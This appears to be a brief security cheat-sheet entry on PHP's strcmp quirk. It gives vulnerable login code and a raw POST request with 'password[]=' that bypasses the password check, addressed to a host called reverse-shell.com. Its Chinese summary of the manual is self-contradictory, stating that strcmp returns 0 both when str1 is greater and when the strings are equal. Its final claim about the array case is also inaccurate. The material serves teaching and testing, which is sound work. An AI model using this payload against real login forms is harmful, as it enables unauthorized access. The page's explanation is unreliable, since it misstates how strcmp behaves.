# PHP Quirks

## strcmp

根据PHP手册strcmp函数返回以下值：
如果str1小于str2，则返回<0;如果str1大于str2，则返回0;如果相等则返回0。

```php
<?php
    if(isset($_POST['password']))
    {   $password = $_POST['password'];
        if(strcmp($password, $actual_password)==0)
        {
            echo "YOU WON!";
        }
    }
?>
```

However, it is possible to manipulate the result of the strcmp function execution:

*Input as an Array*

Request:
```
POST / HTTP/1.1
Host: reverse-shell.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

password[]=
```

```
strcmp($secret, $_POST['password']) returns 0
```
